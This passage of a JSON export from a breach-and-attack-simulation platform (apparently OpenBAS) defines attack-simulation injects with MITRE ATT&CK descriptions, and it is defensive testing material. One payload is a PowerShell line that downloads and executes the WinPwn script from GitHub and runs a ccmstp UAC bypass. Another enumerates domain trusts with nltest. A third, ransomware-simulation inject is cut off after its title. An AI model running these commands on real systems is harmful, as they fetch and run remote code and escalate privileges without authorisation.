      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"WinPwn - UAC Bypass ccmstp technique\",\"fr\":\"WinPwn - UAC Bypass ccmstp technique\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"4652d527-ffc4-4cf2-99bf-11bc2f8b9e72\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "c526742a-991d-4776-9bca-5ca0e975d73d",
        "payload_type" : "Command",
        "payload_name" : "WinPwn - UAC Bypass ccmstp technique",
        "payload_description" : "UAC bypass using ccmstp technique via function of WinPwn",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "fc6ff7a8-e355-4828-aa52-bc61a912e690",
          "attack_pattern_name" : "Bypass User Account Control",
          "attack_pattern_description" : "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
          "attack_pattern_external_id" : "T1548.002",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "85f85b70-0513-4765-a231-c6de150aad97",
            "phase_external_id" : "TA0004",
            "phase_stix_id" : "x-mitre-tactic--5e29b093-294e-49e9-a803-dab3d73b77dd",
            "phase_name" : "Privilege Escalation",
            "phase_shortname" : "privilege-escalation",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "phase_order" : 5
          }, {
            "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
            "phase_external_id" : "TA0005",
            "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
            "phase_name" : "Defense Evasion",
            "phase_shortname" : "defense-evasion",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "phase_order" : 6
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "f3c145f9-3c8d-422c-bd99-296a17a8f567",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:11:17.856904Z",
        "payload_updated_at" : "2025-07-03T14:46:11.955454Z",
        "command_executor" : "psh",
        "command_content" : "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:11:17.876298Z",
      "injector_contract_updated_at" : "2024-12-12T08:11:17.876300Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "fc6ff7a8-e355-4828-aa52-bc61a912e690",
        "attack_pattern_name" : "Bypass User Account Control",
        "attack_pattern_description" : "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
        "attack_pattern_external_id" : "T1548.002",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "85f85b70-0513-4765-a231-c6de150aad97",
          "phase_external_id" : "TA0004",
          "phase_stix_id" : "x-mitre-tactic--5e29b093-294e-49e9-a803-dab3d73b77dd",
          "phase_name" : "Privilege Escalation",
          "phase_shortname" : "privilege-escalation",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
          "phase_order" : 5
        }, {
          "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
          "phase_external_id" : "TA0005",
          "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
          "phase_name" : "Defense Evasion",
          "phase_shortname" : "defense-evasion",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
          "phase_order" : 6
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "42be9889-78bf-43fa-a5f0-b794572968f6",
    "inject_title" : "Windows - Discover domain trusts with nltest",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 0,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Windows - Discover domain trusts with nltest",
          "fr" : "Windows - Discover domain trusts with nltest"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "41e1d4f6-09c9-4afb-b107-9bc33853a86d",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "41e1d4f6-09c9-4afb-b107-9bc33853a86d",
      "injector_contract_labels" : {
        "en" : "Windows - Discover domain trusts with nltest",
        "fr" : "Windows - Discover domain trusts with nltest"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Windows - Discover domain trusts with nltest\",\"fr\":\"Windows - Discover domain trusts with nltest\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"41e1d4f6-09c9-4afb-b107-9bc33853a86d\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "119c95e0-4fd9-4500-8629-998bdf0ffeb1",
        "payload_type" : "Command",
        "payload_name" : "Windows - Discover domain trusts with nltest",
        "payload_description" : "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "f72b5ad5-2c64-4788-9ca3-fe33bd84465a",
          "attack_pattern_name" : "Domain Trust Discovery",
          "attack_pattern_description" : "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
          "attack_pattern_external_id" : "T1482",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
            "phase_external_id" : "TA0007",
            "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
            "phase_name" : "Discovery",
            "phase_shortname" : "discovery",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "phase_order" : 8
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ {
          "executor" : "cmd",
          "get_command" : "echo Sorry RSAT must be installed manually\n",
          "check_command" : "WHERE nltest.exe >NUL 2>&1\n",
          "description" : "nltest.exe from RSAT must be present on disk\n"
        } ],
        "payload_external_id" : "2e22641d-0498-48d2-b9ff-c71e496ccdbe",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:45.089458Z",
        "payload_updated_at" : "2025-07-03T14:50:41.346800Z",
        "command_executor" : "cmd",
        "command_content" : "nltest /domain_trusts\nnltest /trusted_domains\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:45.102140Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:45.102140Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "f72b5ad5-2c64-4788-9ca3-fe33bd84465a",
        "attack_pattern_name" : "Domain Trust Discovery",
        "attack_pattern_description" : "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
        "attack_pattern_external_id" : "T1482",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
          "phase_external_id" : "TA0007",
          "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
          "phase_name" : "Discovery",
          "phase_shortname" : "discovery",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
          "phase_order" : 8
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "d2e94f23-d5ab-4b19-86fb-d1bb42319d23",
    "inject_title" : "Add 100 Files with .akira File Ending + Akira Ransomnote",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
